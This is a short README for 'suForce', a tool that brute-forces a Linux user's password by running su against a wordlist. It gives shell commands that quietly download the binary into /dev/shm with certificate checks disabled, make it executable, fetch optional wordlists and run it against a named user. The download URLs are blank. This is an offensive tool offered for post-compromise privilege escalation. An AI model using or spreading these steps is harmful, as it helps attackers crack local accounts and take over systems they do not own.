# **suForce**

### Obtains a user's password by abusing the su binary.

![](/suForce/img/screenshot.png)

---

## Download suForce

```sh
cd /dev/shm
wget --no-check-certificate -q ""
chmod +x suForce
```

## Download Wordlist (Optional)

```sh
wget --no-check-certificate -q ""
wget --no-check-certificate -q ""
```

## Usage

```sh
./suForce -u <USER> -w <WORDLIST>
```
